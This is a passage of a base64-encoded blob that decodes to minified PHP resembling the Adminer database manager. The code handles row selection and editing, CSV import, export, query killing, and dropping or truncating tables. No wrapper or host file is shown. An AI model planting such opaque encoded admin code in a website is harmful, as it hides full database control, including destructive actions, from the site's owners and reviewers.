wiOigkX1BPU1RbInNlcGFyYXRvciJdPT0idHN2Ij8iXHQiOiI7IikpOyRMPWFycmF5KCk7Zm9yZWFjaCgkYWVbMF1hcyR4PT4kWCl7cHJlZ19tYXRjaF9hbGwoIn4oKD8+XCJbXlwiXSpcIikrfFteJHJnXSopJHJnfiIsJFguJHJnLCRiZSk7aWYoISR4JiYhYXJyYXlfZGlmZigkYmVbMV0sJG5iKSl7JG5iPSRiZVsxXTskeWEtLTt9ZWxzZXskTz1hcnJheSgpO2ZvcmVhY2goJGJlWzFdYXMkcz0+JGtiKSRPW2lkZl9lc2NhcGUoJG5iWyRzXSldPSgka2I9PSIiJiYkcFskbmJbJHNdXVsibnVsbCJdPyJOVUxMIjpxKHN0cl9yZXBsYWNlKCciIicsJyInLHByZWdfcmVwbGFjZSgnfl4ifCIkficsJycsJGtiKSkpKTskTFtdPSRPO319JEk9KCEkTHx8JFViLT5pbnNlcnRVcGRhdGUoJGEsJEwsJHpmKSk7aWYoJEkpJFViLT5jb21taXQoKTtxdWVyaWVzX3JlZGlyZWN0KHJlbW92ZV9mcm9tX3VyaSgicGFnZSIpLGxhbmcoYXJyYXkoJyVkIHJvdyBoYXMgYmVlbiBpbXBvcnRlZC4nLCclZCByb3dzIGhhdmUgYmVlbiBpbXBvcnRlZC4nKSwkeWEpLCRJKTskVWItPnJvbGxiYWNrKCk7fX19JFFnPSRiLT50YWJsZU5hbWUoJFIpO2lmKGlzX2FqYXgoKSl7cGFnZV9oZWFkZXJzKCk7b2Jfc3RhcnQoKTt9ZWxzZQ0KcGFnZV9oZWFkZXIoJ1NlbGVjdCcuIjogJFFnIiwkbik7JE89bnVsbDtpZihpc3NldCgkY2dbImluc2VydCJdKXx8IXN1cHBvcnQoInRhYmxlIikpeyRPPSIiO2ZvcmVhY2goKGFycmF5KSRfR0VUWyJ3aGVyZSJdYXMkWCl7aWYoY291bnQoJE1jWyRYWyJjb2wiXV0pPT0xJiYoJFhbIm9wIl09PSI9Inx8KCEkWFsib3AiXSYmIXByZWdfbWF0Y2goJ35bXyVdficsJFhbInZhbCJdKSkpKSRPLj0iJnNldCIudXJsZW5jb2RlKCJbIi5icmFja2V0X2VzY2FwZSgkWFsiY29sIl0pLiJdIikuIj0iLnVybGVuY29kZSgkWFsidmFsIl0pO319JGItPnNlbGVjdExpbmtzKCRSLCRPKTtpZighJGYmJnN1cHBvcnQoInRhYmxlIikpZWNobyI8cCBjbGFzcz0nZXJyb3InPiIuJ1VuYWJsZSB0byBzZWxlY3QgdGhlIHRhYmxlJy4oJHA/Ii4iOiI6ICIuZXJyb3IoKSkuIlxuIjtlbHNle2VjaG8iPGZvcm0gYWN0aW9uPScnIGlkPSdmb3JtJz5cbiIsIjxkaXYgc3R5bGU9J2Rpc3BsYXk6IG5vbmU7Jz4iO2hpZGRlbl9maWVsZHNfZ2V0KCk7ZWNobyhEQiE9IiI/JzxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImRiIiB2YWx1ZT0iJy5oKERCKS4nIj4nLihpc3NldCgkX0dFVFsibnMiXSk/JzxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Im5zIiB2YWx1ZT0iJy5oKCRfR0VUWyJucyJdKS4nIj4nOiIiKToiIik7ZWNobyc8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJzZWxlY3QiIHZhbHVlPSInLmgoJGEpLiciPicsIjwvZGl2PlxuIjskYi0+c2VsZWN0Q29sdW1uc1ByaW50KCRNLCRmKTskYi0+c2VsZWN0U2VhcmNoUHJpbnQoJFosJGYsJHYpOyRiLT5zZWxlY3RPcmRlclByaW50KCRUZSwkZiwkdik7JGItPnNlbGVjdExpbWl0UHJpbnQoJHopOyRiLT5zZWxlY3RMZW5ndGhQcmludCgkZWgpOyRiLT5zZWxlY3RBY3Rpb25QcmludCgkdik7ZWNobyI8L2Zvcm0+XG4iOyRFPSRfR0VUWyJwYWdlIl07aWYoJEU9PSJsYXN0Iil7JFBjPSRnLT5yZXN1bHQoY291bnRfcm93cygkYSwkWiwkemQsJFZjKSk7JEU9Zmxvb3IobWF4KDAsJFBjLTEpLyR6KTt9JG9nPSRNO2lmKCEkb2cpeyRvZ1tdPSIqIjtpZigkRGUpJG9nW109JERlO30keWI9Y29udmVydF9maWVsZHMoJGYsJHAsJE0pO2lmKCR5Yikkb2dbXT1zdWJzdHIoJHliLDIpOyRJPSRVYi0+c2VsZWN0KCRhLCRvZywkWiwkVmMsJFRlLCR6LCRFLHRydWUpO2lmKCEkSSllY2hvIjxwIGNsYXNzPSdlcnJvcic+Ii5lcnJvcigpLiJcbiI7ZWxzZXtpZigkdz09Im1zc3FsIiYmJEUpJEktPnNlZWsoJHoqJEUpOyRqYz1hcnJheSgpO2VjaG8iPGZvcm0gYWN0aW9uPScnIG1ldGhvZD0ncG9zdCcgZW5jdHlwZT0nbXVsdGlwYXJ0L2Zvcm0tZGF0YSc+XG4iOyRMPWFycmF5KCk7d2hpbGUoJEs9JEktPmZldGNoX2Fzc29jKCkpe2lmKCRFJiYkdz09Im9yYWNsZSIpdW5zZXQoJEtbIlJOVU0iXSk7JExbXT0kSzt9aWYoJF9HRVRbInBhZ2UiXSE9Imxhc3QiJiYrJHomJiRWYyYmJHpkJiYkdz09InNxbCIpJFBjPSRnLT5yZXN1bHQoIiBTRUxFQ1QgRk9VTkRfUk9XUygpIik7aWYoISRMKWVjaG8iPHAgY2xhc3M9J21lc3NhZ2UnPiIuJ05vIHJvd3MuJy4iXG4iO2Vsc2V7JE9hPSRiLT5iYWNrd2FyZEtleXMoJGEsJFFnKTtlY2hvIjx0YWJsZSBpZD0ndGFibGUnIGNlbGxzcGFjaW5nPScwJyBjbGFzcz0nbm93cmFwIGNoZWNrYWJsZScgb25jbGljaz0ndGFibGVDbGljayhldmVudCk7JyBvbmRibGNsaWNrPSd0YWJsZUNsaWNrKGV2ZW50LCB0cnVlKTsnIG9ua2V5ZG93bj0ncmV0dXJuIGVkaXRpbmdLZXlkb3duKGV2ZW50KTsnPlxuIiwiPHRoZWFkPjx0cj4iLighJFZjJiYkTT8iIjoiPHRkPjxpbnB1dCB0eXBlPSdjaGVja2JveCcgaWQ9J2FsbC1wYWdlJyBvbmNsaWNrPSdmb3JtQ2hlY2sodGhpcywgL2NoZWNrLyk7Jz4gPGEgaHJlZj0nIi5oKCRfR0VUWyJtb2RpZnkiXT9yZW1vdmVfZnJvbV91cmkoIm1vZGlmeSIpOiRfU0VSVkVSWyJSRVFVRVNUX1VSSSJdLiImbW9kaWZ5PTEiKS4iJz4iLidNb2RpZnknLiI8L2E+Iik7JHVlPWFycmF5KCk7JFNjPWFycmF5KCk7cmVzZXQoJE0pOyRNZj0xO2ZvcmVhY2goJExbMF1hcyR4PT4kWCl7aWYoJHghPSREZSl7JFg9JF9HRVRbImNvbHVtbnMiXVtrZXkoJE0pXTskbz0kcFskTT8oJFg/JFhbImNvbCJdOmN1cnJlbnQoJE0pKTokeF07JEM9KCRvPyRiLT5maWVsZE5hbWUoJG8sJE1mKTooJFhbImZ1biJdPyIqIjokeCkpO2lmKCRDIT0iIil7JE1mKys7JHVlWyR4XT0kQzskZT1pZGZfZXNjYXBlKCR4KTskZ2Q9cmVtb3ZlX2Zyb21fdXJpKCcob3JkZXJ8ZGVzYylbXj1dKnxwYWdlJykuJyZvcmRlciU1QjAlNUQ9Jy51cmxlbmNvZGUoJHgpOyRNYj0iJmRlc2MlNUIwJTVEPTEiO2VjaG8nPHRoIG9ubW91c2VvdmVyPSJjb2x1bW5Nb3VzZSh0aGlzKTsiIG9ubW91c2VvdXQ9ImNvbHVtbk1vdXNlKHRoaXMsIFwnIGhpZGRlblwnKTsiPicsJzxhIGhyZWY9IicuaCgkZ2QuKCRUZVswXT09JGV8fCRUZVswXT09JHh8fCghJFRlJiYkemQmJiRWY1swXT09JGUpPyRNYjonJykpLiciPic7ZWNobw0KYXBwbHlfc3FsX2Z1bmN0aW9uKCRYWyJmdW4iXSwkQykuIjwvYT4iO2VjaG8iPHNwYW4gY2xhc3M9J2NvbHVtbiBoaWRkZW4nPiIsIjxhIGhyZWY9JyIuaCgkZ2QuJE1iKS4iJyB0aXRsZT0nIi4nZGVzY2VuZGluZycuIicgY2xhc3M9J3RleHQnPiDDosKGwpM8L2E+IjtpZighJFhbImZ1biJdKWVjaG8nPGEgaHJlZj0iI2ZpZWxkc2V0LXNlYXJjaCIgb25jbGljaz0ic2VsZWN0U2VhcmNoKFwnJy5oKGpzX2VzY2FwZSgkeCkpLidcJyk7IHJldHVybiBmYWxzZTsiIHRpdGxlPSInLidTZWFyY2gnLiciIGNsYXNzPSJ0ZXh0IGpzb25seSI+ID08L2E+JztlY2hvIjwvc3Bhbj4iO30kU2NbJHhdPSRYWyJmdW4iXTtuZXh0KCRNKTt9fSRUZD1hcnJheSgpO2lmKCRfR0VUWyJtb2RpZnkiXSl7Zm9yZWFjaCgkTA0KYXMkSyl7Zm9yZWFjaCgkSw0KYXMkeD0+JFgpJFRkWyR4XT1tYXgoJFRkWyR4XSxtaW4oNDAsc3RybGVuKHV0ZjhfZGVjb2RlKCRYKSkpKTt9fWVjaG8oJE9hPyI8dGg+Ii4nUmVsYXRpb25zJzoiIikuIjwvdGhlYWQ+XG4iO2lmKGlzX2FqYXgoKSl7aWYoJHolMj09MSYmJEUlMj09MSlvZGQoKTtvYl9lbmRfY2xlYW4oKTt9Zm9yZWFjaCgkYi0+cm93RGVzY3JpcHRpb25zKCRMLCRNYylhcyR0ZT0+JEspeyRCaD11bmlxdWVfYXJyYXkoJExbJHRlXSwkdik7aWYoISRCaCl7JEJoPWFycmF5KCk7Zm9yZWFjaCgkTFskdGVdYXMkeD0+JFgpe2lmKCFwcmVnX21hdGNoKCd+XihDT1VOVFxcKChcXCp8KERJU1RJTkNUICk/YCg/OlteYF18YGApK2ApXFwpfChBVkd8R1JPVVBfQ09OQ0FUfE1BWHxNSU58U1VNKVxcKGAoPzpbXmBdfGBgKStgXFwpKSR+JywkeCkpJEJoWyR4XT0kWDt9fSRDaD0iIjtmb3JlYWNoKCRCaA0KYXMkeD0+JFgpe2lmKCgkdz09InNxbCJ8fCR3PT0icGdzcWwiKSYmc3RybGVuKCRYKT42NCl7JHg9KHN0cnBvcygkeCwnKCcpPyR4OmlkZl9lc2NhcGUoJHgpKTskeD0iTUQ1KCIuKCR3PT0nc3FsJyYmcHJlZ19tYXRjaCgifl51dGY4X34iLCRwWyR4XVsiY29sbGF0aW9uIl0pPyR4OiJDT05WRVJUKCR4IFVTSU5HICIuY2hhcnNldCgkZykuIikiKS4iKSI7JFg9bWQ1KCRYKTt9JENoLj0iJiIuKCRYIT09bnVsbD91cmxlbmNvZGUoIndoZXJlWyIuYnJhY2tldF9lc2NhcGUoJHgpLiJdIikuIj0iLnVybGVuY29kZSgkWCk6Im51bGwlNUIlNUQ9Ii51cmxlbmNvZGUoJHgpKTt9ZWNobyI8dHIiLm9kZCgpLiI+Ii4oISRWYyYmJE0/IiI6Ijx0ZD4iLmNoZWNrYm94KCJjaGVja1tdIixzdWJzdHIoJENoLDEpLGluX2FycmF5KHN1YnN0cigkQ2gsMSksKGFycmF5KSRfUE9TVFsiY2hlY2siXSksIiIsInRoaXMuZm9ybVsnYWxsJ10uY2hlY2tlZCA9IGZhbHNlOyBmb3JtVW5jaGVjaygnYWxsLXBhZ2UnKTsiKS4oJHpkfHxpbmZvcm1hdGlvbl9zY2hlbWEoREIpPyIiOiIgPGEgaHJlZj0nIi5oKE1FLiJlZGl0PSIudXJsZW5jb2RlKCRhKS4kQ2gpLiInPiIuJ2VkaXQnLiI8L2E+IikpO2ZvcmVhY2goJEsNCmFzJHg9PiRYKXtpZihpc3NldCgkdWVbJHhdKSl7JG89JHBbJHhdO2lmKCRYIT0iIiYmKCFpc3NldCgkamNbJHhdKXx8JGpjWyR4XSE9IiIpKSRqY1skeF09KGlzX21haWwoJFgpPyR1ZVskeF06IiIpOyRfPSIiO2lmKHByZWdfbWF0Y2goJ35ibG9ifGJ5dGVhfHJhd3xmaWxlficsJG9bInR5cGUiXSkmJiRYIT0iIikkXz1NRS4nZG93bmxvYWQ9Jy51cmxlbmNvZGUoJGEpLicmZmllbGQ9Jy51cmxlbmNvZGUoJHgpLiRDaDtpZighJF8mJiRYIT09bnVsbCl7Zm9yZWFjaCgoYXJyYXkpJE1jWyR4XWFzJHEpe2lmKGNvdW50KCRNY1skeF0pPT0xfHxlbmQoJHFbInNvdXJjZSJdKT09JHgpeyRfPSIiO2ZvcmVhY2goJHFbInNvdXJjZSJdYXMkcz0+JEFnKSRfLj13aGVyZV9saW5rKCRzLCRxWyJ0YXJnZXQiXVskc10sJExbJHRlXVskQWddKTskXz0oJHFbImRiIl0hPSIiP3ByZWdfcmVwbGFjZSgnfihbPyZdZGI9KVteJl0rficsJ1xcMScudXJsZW5jb2RlKCRxWyJkYiJdKSxNRSk6TUUpLidzZWxlY3Q9Jy51cmxlbmNvZGUoJHFbInRhYmxlIl0pLiRfO2lmKGNvdW50KCRxWyJzb3VyY2UiXSk9PTEpYnJlYWs7fX19aWYoJHg9PSJDT1VOVCgqKSIpeyRfPU1FLiJzZWxlY3Q9Ii51cmxlbmNvZGUoJGEpOyRzPTA7Zm9yZWFjaCgoYXJyYXkpJF9HRVRbIndoZXJlIl1hcyRXKXtpZighYXJyYXlfa2V5X2V4aXN0cygkV1siY29sIl0sJEJoKSkkXy49d2hlcmVfbGluaygkcysrLCRXWyJjb2wiXSwkV1sidmFsIl0sJFdbIm9wIl0pO31mb3JlYWNoKCRCaA0KYXMkRWQ9PiRXKSRfLj13aGVyZV9saW5rKCRzKyssJEVkLCRXKTt9JFg9c2VsZWN0X3ZhbHVlKCRYLCRfLCRvLCRlaCk7JGhkPWgoInZhbFskQ2hdWyIuYnJhY2tldF9lc2NhcGUoJHgpLiJdIik7JFk9JF9QT1NUWyJ2YWwiXVskQ2hdW2JyYWNrZXRfZXNjYXBlKCR4KV07JGVjPSFpc19hcnJheSgkS1skeF0pJiZpc191dGY4KCRYKSYmJExbJHRlXVskeF09PSRLWyR4XSYmISRTY1skeF07JGRoPXByZWdfbWF0Y2goJ350ZXh0fGxvYn4nLCRvWyJ0eXBlIl0pO2lmKCgkX0dFVFsibW9kaWZ5Il0mJiRlYyl8fCRZIT09bnVsbCl7JFljPWgoJFkhPT1udWxsPyRZOiRLWyR4XSk7ZWNobyI8dGQ+Ii4oJGRoPyI8dGV4dGFyZWEgbmFtZT0nJGhkJyBjb2xzPSczMCcgcm93cz0nIi4oc3Vic3RyX2NvdW50KCRLWyR4XSwiXG4iKSsxKS4iJz4kWWM8L3RleHRhcmVhPiI6IjxpbnB1dCBuYW1lPSckaGQnIHZhbHVlPSckWWMnIHNpemU9JyRUZFskeF0nPiIpO31lbHNleyRYZD1zdHJwb3MoJFgsIjxpPi4uLjwvaT4iKTtlY2hvIjx0ZCBpZD0nJGhkJyBvbmNsaWNrPVwic2VsZWN0Q2xpY2sodGhpcywgZXZlbnQsICIuKCRYZD8yOigkZGg/MTowKSkuKCRlYz8iIjoiLCAnIi5oKCdVc2UgZWRpdCBsaW5rIHRvIG1vZGlmeSB0aGlzIHZhbHVlLicpLiInIikuIik7XCI+JFgiO319fWlmKCRPYSllY2hvIjx0ZD4iOyRiLT5iYWNrd2FyZEtleXNQcmludCgkT2EsJExbJHRlXSk7ZWNobyI8L3RyPlxuIjt9aWYoaXNfYWpheCgpKWV4aXQ7ZWNobyI8L3RhYmxlPlxuIjt9aWYoKCRMfHwkRSkmJiFpc19hamF4KCkpeyR0Yz10cnVlO2lmKCRfR0VUWyJwYWdlIl0hPSJsYXN0Iil7aWYoISskeikkUGM9Y291bnQoJEwpO2Vsc2VpZigkdyE9InNxbCJ8fCEkemQpeyRQYz0oJHpkP2ZhbHNlOmZvdW5kX3Jvd3MoJFIsJFopKTtpZigkUGM8bWF4KDFlNCwyKigkRSsxKSokeikpJFBjPXJlc2V0KHNsb3dfcXVlcnkoY291bnRfcm93cygkYSwkWiwkemQsJFZjKSkpO2Vsc2UkdGM9ZmFsc2U7fX1pZigrJHomJigkUGM9PT1mYWxzZXx8JFBjPiR6fHwkRSkpe2VjaG8iPHAgY2xhc3M9J3BhZ2VzJz4iOyRkZT0oJFBjPT09ZmFsc2U/JEUrKGNvdW50KCRMKT49JHo/MjoxKTpmbG9vcigoJFBjLTEpLyR6KSk7aWYoJHchPSJzaW1wbGVkYiIpe2VjaG8nPGEgaHJlZj0iJy5oKHJlbW92ZV9mcm9tX3VyaSgicGFnZSIpKS4iXCIgb25jbGljaz1cInBhZ2VDbGljayh0aGlzLmhyZWYsICtwcm9tcHQoJyIuJ1BhZ2UnLiInLCAnIi4oJEUrMSkuIicpLCBldmVudCk7IHJldHVybiBmYWxzZTtcIj4iLidQYWdlJy4iPC9hPjoiLHBhZ2luYXRpb24oMCwkRSkuKCRFPjU/IiAuLi4iOiIiKTtmb3IoJHM9bWF4KDEsJEUtNCk7JHM8bWluKCRkZSwkRSs1KTskcysrKWVjaG8NCnBhZ2luYXRpb24oJHMsJEUpO2lmKCRkZT4wKXtlY2hvKCRFKzU8JGRlPyIgLi4uIjoiIiksKCR0YyYmJFBjIT09ZmFsc2U/cGFnaW5hdGlvbigkZGUsJEUpOiIgPGEgaHJlZj0nIi5oKHJlbW92ZV9mcm9tX3VyaSgicGFnZSIpLiImcGFnZT1sYXN0IikuIicgdGl0bGU9J34kZGUnPiIuJ2xhc3QnLiI8L2E+Iik7fWVjaG8oKCRQYz09PWZhbHNlP2NvdW50KCRMKSsxOiRQYy0kRSokeik+JHo/JyA8YSBocmVmPSInLmgocmVtb3ZlX2Zyb21fdXJpKCJwYWdlIikuIiZwYWdlPSIuKCRFKzEpKS4nIiBvbmNsaWNrPSJyZXR1cm4gIXNlbGVjdExvYWRNb3JlKHRoaXMsICcuKCskeikuJywgXCcnLidMb2FkaW5nJy4nLi4uXCcpOyIgY2xhc3M9ImxvYWRtb3JlIj4nLidMb2FkIG1vcmUgZGF0YScuJzwvYT4nOicnKTt9ZWxzZXtlY2hvJ1BhZ2UnLiI6IixwYWdpbmF0aW9uKDAsJEUpLigkRT4xPyIgLi4uIjoiIiksKCRFP3BhZ2luYXRpb24oJEUsJEUpOiIiKSwoJGRlPiRFP3BhZ2luYXRpb24oJEUrMSwkRSkuKCRkZT4kRSsxPyIgLi4uIjoiIik6IiIpO319ZWNobyI8cCBjbGFzcz0nY291bnQnPlxuIiwoJFBjIT09ZmFsc2U/IigiLigkdGM/IiI6In4gIikubGFuZyhhcnJheSgnJWQgcm93JywnJWQgcm93cycpLCRQYykuIikgIjoiIik7JFJiPSgkdGM/IiI6In4gIikuJFBjO2VjaG8NCmNoZWNrYm94KCJhbGwiLDEsMCwnd2hvbGUgcmVzdWx0JywidmFyIGNoZWNrZWQgPSBmb3JtQ2hlY2tlZCh0aGlzLCAvY2hlY2svKTsgc2VsZWN0Q291bnQoJ3NlbGVjdGVkJywgdGhpcy5jaGVja2VkID8gJyRSYicgOiBjaGVja2VkKTsgc2VsZWN0Q291bnQoJ3NlbGVjdGVkMicsIHRoaXMuY2hlY2tlZCB8fCAhY2hlY2tlZCA/ICckUmInIDogY2hlY2tlZCk7IikuIlxuIjtpZigkYi0+c2VsZWN0Q29tbWFuZFByaW50KCkpe2VjaG8nPGZpZWxkc2V0JywoJF9HRVRbIm1vZGlmeSJdPycnOicgY2xhc3M9Impzb25seSInKSwnPjxsZWdlbmQ+TW9kaWZ5PC9sZWdlbmQ+PGRpdj4NCjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJTYXZlIicsKCRfR0VUWyJtb2RpZnkiXT8nJzonIHRpdGxlPSInLidDdHJsK2NsaWNrIG9uIGEgdmFsdWUgdG8gbW9kaWZ5IGl0LicuJyInKSwnPg0KPC9kaXY+PC9maWVsZHNldD4NCjxmaWVsZHNldD48bGVnZW5kPlNlbGVjdGVkIDxzcGFuIGlkPSJzZWxlY3RlZCI+PC9zcGFuPjwvbGVnZW5kPjxkaXY+DQo8aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJlZGl0IiB2YWx1ZT0iRWRpdCI+DQo8aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJjbG9uZSIgdmFsdWU9IkNsb25lIj4NCjxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9ImRlbGV0ZSIgdmFsdWU9IkRlbGV0ZSInLGNvbmZpcm0oKSwnPg0KPC9kaXY+PC9maWVsZHNldD4NCic7fSROYz0kYi0+ZHVtcEZvcm1hdCgpO2ZvcmVhY2goKGFycmF5KSRfR0VUWyJjb2x1bW5zIl1hcyRlKXtpZigkZVsiZnVuIl0pe3Vuc2V0KCROY1snc3FsJ10pO2JyZWFrO319aWYoJE5jKXtwcmludF9maWVsZHNldCgiZXhwb3J0IiwnRXhwb3J0Jy4iIDxzcGFuIGlkPSdzZWxlY3RlZDInPjwvc3Bhbj4iKTskZGY9JGItPmR1bXBPdXRwdXQoKTtlY2hvKCRkZj9odG1sX3NlbGVjdCgib3V0cHV0IiwkZGYsJHhhWyJvdXRwdXQiXSkuIiAiOiIiKSxodG1sX3NlbGVjdCgiZm9ybWF0IiwkTmMsJHhhWyJmb3JtYXQiXSksIiA8aW5wdXQgdHlwZT0nc3VibWl0JyBuYW1lPSdleHBvcnQnIHZhbHVlPSciLidFeHBvcnQnLiInPlxuIiwiPC9kaXY+PC9maWVsZHNldD5cbiI7fWVjaG8oISRWYyYmJE0/IiI6IjxzY3JpcHQgdHlwZT0ndGV4dC9qYXZhc2NyaXB0Jz50YWJsZUNoZWNrKCk7PC9zY3JpcHQ+XG4iKTt9aWYoJGItPnNlbGVjdEltcG9ydFByaW50KCkpe3ByaW50X2ZpZWxkc2V0KCJpbXBvcnQiLCdJbXBvcnQnLCEkTCk7ZWNobyI8aW5wdXQgdHlwZT0nZmlsZScgbmFtZT0nY3N2X2ZpbGUnPiAiLGh0bWxfc2VsZWN0KCJzZXBhcmF0b3IiLGFycmF5KCJjc3YiPT4iQ1NWLCIsImNzdjsiPT4iQ1NWOyIsInRzdiI9PiJUU1YiKSwkeGFbImZvcm1hdCJdLDEpO2VjaG8iIDxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J2ltcG9ydCcgdmFsdWU9JyIuJ0ltcG9ydCcuIic+IiwiPC9kaXY+PC9maWVsZHNldD5cbiI7fSRiLT5zZWxlY3RFbWFpbFByaW50KGFycmF5X2ZpbHRlcigkamMsJ3N0cmxlbicpLCRmKTtlY2hvIjxwPjxpbnB1dCB0eXBlPSdoaWRkZW4nIG5hbWU9J3Rva2VuJyB2YWx1ZT0nJFQnPjwvcD5cbiIsIjwvZm9ybT5cbiI7fX1pZihpc19hamF4KCkpe29iX2VuZF9jbGVhbigpO2V4aXQ7fX1lbHNlaWYoaXNzZXQoJF9HRVRbInZhcmlhYmxlcyJdKSl7JEZnPWlzc2V0KCRfR0VUWyJzdGF0dXMiXSk7cGFnZV9oZWFkZXIoJEZnPydTdGF0dXMnOidWYXJpYWJsZXMnKTskUmg9KCRGZz9zaG93X3N0YXR1cygpOnNob3dfdmFyaWFibGVzKCkpO2lmKCEkUmgpZWNobyI8cCBjbGFzcz0nbWVzc2FnZSc+Ii4nTm8gcm93cy4nLiJcbiI7ZWxzZXtlY2hvIjx0YWJsZSBjZWxsc3BhY2luZz0nMCc+XG4iO2ZvcmVhY2goJFJoDQphcyR4PT4kWCl7ZWNobyI8dHI+IiwiPHRoPjxjb2RlIGNsYXNzPSdqdXNoLSIuJHcuKCRGZz8ic3RhdHVzIjoic2V0IikuIic+Ii5oKCR4KS4iPC9jb2RlPiIsIjx0ZD4iLm5ic3AoJFgpO31lY2hvIjwvdGFibGU+XG4iO319ZWxzZWlmKGlzc2V0KCRfR0VUWyJzY3JpcHQiXSkpe2hlYWRlcigiQ29udGVudC1UeXBlOiB0ZXh0L2phdmFzY3JpcHQ7IGNoYXJzZXQ9dXRmLTgiKTtpZigkX0dFVFsic2NyaXB0Il09PSJkYiIpeyROZz1hcnJheSgiRGF0YV9sZW5ndGgiPT4wLCJJbmRleF9sZW5ndGgiPT4wLCJEYXRhX2ZyZWUiPT4wKTtmb3JlYWNoKHRhYmxlX3N0YXR1cygpYXMkQz0+JFIpe2pzb25fcm93KCJDb21tZW50LSRDIixuYnNwKCRSWyJDb21tZW50Il0pKTtpZighaXNfdmlldygkUikpe2ZvcmVhY2goYXJyYXkoIkVuZ2luZSIsIkNvbGxhdGlvbiIpYXMkeClqc29uX3JvdygiJHgtJEMiLG5ic3AoJFJbJHhdKSk7Zm9yZWFjaCgkTmcrYXJyYXkoIkF1dG9faW5jcmVtZW50Ij0+MCwiUm93cyI9PjApYXMkeD0+JFgpe2lmKCRSWyR4XSE9IiIpeyRYPWZvcm1hdF9udW1iZXIoJFJbJHhdKTtqc29uX3JvdygiJHgtJEMiLCgkeD09IlJvd3MiJiYkWCYmJFJbIkVuZ2luZSJdPT0oJENnPT0icGdzcWwiPyJ0YWJsZSI6Iklubm9EQiIpPyJ+ICRYIjokWCkpO2lmKGlzc2V0KCROZ1skeF0pKSROZ1skeF0rPSgkUlsiRW5naW5lIl0hPSJJbm5vREIifHwkeCE9IkRhdGFfZnJlZSI/JFJbJHhdOjApO31lbHNlaWYoYXJyYXlfa2V5X2V4aXN0cygkeCwkUikpanNvbl9yb3coIiR4LSRDIik7fX19Zm9yZWFjaCgkTmcNCmFzJHg9PiRYKWpzb25fcm93KCJzdW0tJHgiLGZvcm1hdF9udW1iZXIoJFgpKTtqc29uX3JvdygiIik7fWVsc2VpZigkX0dFVFsic2NyaXB0Il09PSJraWxsIikkZy0+cXVlcnkoIktJTEwgIi5udW1iZXIoJF9QT1NUWyJraWxsIl0pKTtlbHNle2ZvcmVhY2goY291bnRfdGFibGVzKCRiLT5kYXRhYmFzZXMoKSlhcyRtPT4kWCl7anNvbl9yb3coInRhYmxlcy0kbSIsJFgpO2pzb25fcm93KCJzaXplLSRtIixkYl9zaXplKCRtKSk7fWpzb25fcm93KCIiKTt9ZXhpdDt9ZWxzZXskV2c9YXJyYXlfbWVyZ2UoKGFycmF5KSRfUE9TVFsidGFibGVzIl0sKGFycmF5KSRfUE9TVFsidmlld3MiXSk7aWYoJFdnJiYhJG4mJiEkX1BPU1RbInNlYXJjaCJdKXskST10cnVlOyRpZT0iIjtpZigkdz09InNxbCImJmNvdW50KCRfUE9TVFsidGFibGVzIl0pPjEmJigkX1BPU1RbImRyb3AiXXx8JF9QT1NUWyJ0cnVuY2F0ZSJdfHwkX1BPU1RbImNvcHkiXSkpcXVlcmllcygiU0VUIGZvcmVpZ25fa2V5X2NoZWNrcyA9IDAiKTtpZigkX1BPU1RbInRydW5jYXRlIl0pe2lmKCRfUE9TVFsidGFibGVzIl0pJEk9dHJ1bmNhdGVfdGFibGVzKCRfUE9TVFsidGFibGVzIl0pOyRpZT0nVGFibGVzIGhhdmUgYmVlbiB0cnVuY2F0ZWQuJzt9ZWxzZWlmKCRfUE9TVFsibW92ZSJdKXskST1tb3ZlX3RhYmxlcygoYXJyYXkpJF9QT1NUWyJ0YWJsZXMiXSwoYXJyYXkpJF9QT1NUWyJ2aWV3cyJdLCRfUE9TVFsidGFyZ2V0Il0pOyRpZT0nVGFibGVzIGhhdmUgYmVlbiBtb3ZlZC4nO31lbHNlaWYoJF9QT1NUWyJjb3B5Il0peyRJPWNvcHlfdGFibGVzKChhcnJheSkkX1BPU1RbInRhYmxlcyJdLChhcnJheSkkX1BPU1RbInZpZXdzIl0sJF9QT1NUWyJ0YXJnZXQiXSk7JGllPSdUYWJsZXMgaGF2ZSBiZWVuIGNvcGllZC4nO31lbHNlaWYoJF9QT1NUWyJkcm9wIl0pe2lmKCRfUE9TVFsidmlld3MiXSkkST1kcm9wX3ZpZXdzKCRfUE9TVFsidmlld3MiXSk7aWYoJEkmJiRfUE9TVFsidGFibGVzIl0pJEk9ZHJvcF90YWJsZXMoJF9QT1NUWyJ0YWJsZXMiXSk7JGllPSdUYWJsZXMgaGF2ZSBiZWVuIGRyb3BwZWQuJzt9ZWxzZWlmKCR3IT0ic3FsIil7JEk9KCR3PT0ic3FsaXRlIj9xdWVyaWVzKCJWQUNVVU0iKTphcHBseV9xdWVyaWVzKCJWQUNVVU0iLigkX1BPU1RbIm9wdGltaXplIl0/IiI6IiBBTkFMWVpFIiksJF9QT1NUWyJ0YWJsZXMiXSkpOyRpZT0nVGFibGVzIGhhdmUgYmVlbiBvcHRpbWl6ZWQuJzt9ZWxzZWlmKCEkX1BPU1RbInRhYmxlcyJdKSRpZT0nTm8gdGFibGVzLic7ZWxzZWlmKCRJPXF1ZXJpZXMoKCRfUE9TVFsib3B0aW1pemUiXT8iT1BUSU1JWkUiOigkX1BPU1RbImNoZWNrIl0/IkNIRUNLIjooJF9QT1NUWyJyZXBhaXIiXT8iUkVQQUlSIjoiQU5BTFlaRSIpKSkuIiBUQUJMRSAiLmltcGxvZGUoIiwgIixhcnJheV9tYXAoJ2lkZl9lc2NhcGUnLCRfUE9TVFsidGFibGVzIl0pKSkpe3doaWxlKCRLPSRJLT5mZXRjaF9hc3NvYygpKSRpZS49IjxiPiIuaCgkS1siVGFibGUiXSkuIjwvYj46ICIuaCgkS1siTXNnX3RleHQiXSkuIjxicj4iO31xdWVyaWVzX3JlZGlyZWN0KHN1YnN0cihNRSwwLC0xKSwkaWUsJEkpO31wYWdlX2hlYWRlcigoJF9HRVRbIm5zIl09PSIiPydEYXRhYmFzZScuIjogIi5oKERCKTonU2NoZW1hJy4iOiAiLmgoJF9HRVRbIm5zIl0pKSwkbix0cnVlKTtpZigkYi